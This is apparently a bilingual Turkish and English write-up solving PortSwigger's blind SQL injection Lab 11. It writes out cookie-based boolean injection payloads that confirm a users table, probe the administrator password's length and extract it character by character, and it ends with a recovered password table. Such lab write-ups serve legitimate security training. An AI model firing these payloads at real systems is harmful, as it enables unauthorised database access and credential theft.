# BlindSQLi
Portswigger -> Web Security Academy -> SQL Injection -> Blind

->Portswigger platformu; içerisinde bulunan Web Security ve daha bir çok alandaki eğitimlere ücretsiz erişim hakkı tanımaktadır.
->Bunun yanında üretmiş oldukları çok fonksiyonlu BurpSuit aracının sektör açısından önemi yadsınamaz.
->Bu proje Portswigger -> Web Security Academy -> SQL Injection -> Blind -> Lab11 için çözüm adımlarını içermektedir.
->BurpSuit'in Community Edition sürümü kullamılmıştır.
_________________________________________________________________________________________________________________________________

# BlindSQLi
Portswigger -> Web Security Academy -> SQL Injection -> Blind

->Portswigger platform; Free access to trainings in Web Security and many other areas is provided.
->In addition, it is undeniable to demonstrate the performance of the multifunctional BurpSuit vehicles that I have produced.
->This project contains the solution steps for Portswigger -> Web Security Academy -> SQL Injection -> Blind -> Lab11.
->Community Edition of BurpSuit is used.




                                <---Portswigger -> Web Security Academy -> SQL Injection -> Blind -> Lab11--->
                                ______________________________________________________________________________
                                
 
Blind SQLi

Zaafiyet Parametresi - Cookie

Hedefler:

1-) Admin şifresini numaralandır.

2-) Admin olarak giriş yap.

Öncelikle bir zaafiyetin tespiti ardından sömürülmesi gerektiğini biliyoruz. Bu sebeple ilk adımımız zaafiyet bulunduğu belirtilen Cookie üzerinden doğru/yanlış sorgular yaparak zaafiyetin varlığından emin olmamız gerekmekte.
Çözüm boyunca "Welcome back" sonucu aldığımız her sorgulama doğrulama yapmış olduğumuz anlamına gelmektedir. Eğer Response alanında bu veriyi göremiyorsak ya yaptığımız uygulamada yanlışlık vardır ya da olumsuz dönüş alıyoruzdur.
_______________________________________________________________________________________________________________________________________________________________________

Analiz:

1-) Zaafiyetin doğru olup olmadığının kontrolü.

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl'
-> Eğer bu işlem işe yararsa -> dönüş doğru olacak -> Welcome back message
-> Eğer bu işlem işe yaramazsa -> dönüş olmayacak -> No Welcome back message

Sql tarafında çalıştırıldığını tahmin edebileceğimiz sorguları hayal etmemiz ve deneme yanılma yolu ile doğruluğunu tespit etmemiz gerekli.

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and 1=0--'
->Yanlış -> No Welcome back

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and 1=1--'
-> Doğru -> Welcome back


_______________________________________________________________________________________________________________________________________________________________________


2-) Bir Kullanıcı Tablosu Olup Olmadığını Kontrol Et

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select 'x' from users LIMIT 1)='x'--'
-> users tablosu databasede mevcut.

_______________________________________________________________________________________________________________________________________________________________________


3-) Admin kullancısının Users tablosunda olup olmadığını kontrol et.

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select username from users where username='administrator')='administrator'--'
-> Admin kullanıcısı databasedeki users tablosunda mevcut.

_______________________________________________________________________________________________________________________________________________________________________


4-) Admin şifresinin numaralandır.

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select password from users where username='administrator')='Welcome2021!'--'
-> Kaba kuvvet saldırı gibi olduğundan mantıklı bir sorgu olmayıp istediğimiz sonucu vermeyecektir.

*Öncelikle password uzunluğunu bulmamız lazım.
select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select username from users where username='administrator' and LENGTH (password)>20)='administrator'--' ///->20 değerine kadar denemeler yapılabilir ancak
BurpSuit yardımı ile de kolaylıkla bulunması mümkün.
->Şifre uzunluğu 20 karakter.

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select substring(password,2,1) from users where username='administrator')='a'--'

123456789 10 11 12 13 14 15 16 17 18 19 20
a1g2k2v3f  j  r  a  w  y  z  y  6  t  l  9


***********************************************************************************************************************************************************************


Goals:

1-) Number the admin password.

2-) Login as admin.

We know that first of all, a vulnerability must be detected and then exploited. For this reason, our first step is to make sure that the vulnerability exists by making correct/false queries on the Cookie, which is stated to be vulnerable.
Every query we get a "Welcome back" result throughout the solution means that we have verified. If we cannot see this data in the Response field, either there is an error in our application or we receive a negative response.

_______________________________________________________________________________________________________________________________________________________________________

Analysis:

1-) Checking whether the vulnerability is correct.

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl'
-> If this works -> return will be correct -> Welcome back message
-> If this doesn't work -> no return -> No Welcome back message

We need to imagine the queries that we can guess to be run on the SQL side and determine their accuracy by trial and error.

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and 1=0--'
->False -> No Welcome back

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and 1=1--'
-> Correct -> Welcome back

_______________________________________________________________________________________________________________________________________________________________________


2-) Check if there is a User Table

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select 'x' from users LIMIT 1)='x'--'
-> users table exists in database.

_______________________________________________________________________________________________________________________________________________________________________


3-) Check if the Admin user is in the Users table.

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select username from users where username='administrator')='administrator'--'
-> The admin user exists in the users table in the database.

_______________________________________________________________________________________________________________________________________________________________________


4-) Number of the admin password.

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select password from users where username='administrator')='Welcome2021!'--'
-> Since it is like a brute force attack, it is not a logical query and will not give the result we want.

*First we need to find the password length.
select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select username from users where username='administrator' and LENGTH (password)>20)='administrator'--' 
///-> Attempts up to 20 can be done but It can be easily found with the help of BurpSuit.
->Password length 20 characters.

select tracking.id from tracking.table where trackingId= 'Gw7uThB7J9IIhYBl' and (select substring(password,2,1) from users where username='administrator')='a'--'

123456789 10 11 12 13 14 15 16 17 18 19 20
a1g2k2v3f  j  r  a  w  y  z  y  6  t  l  9

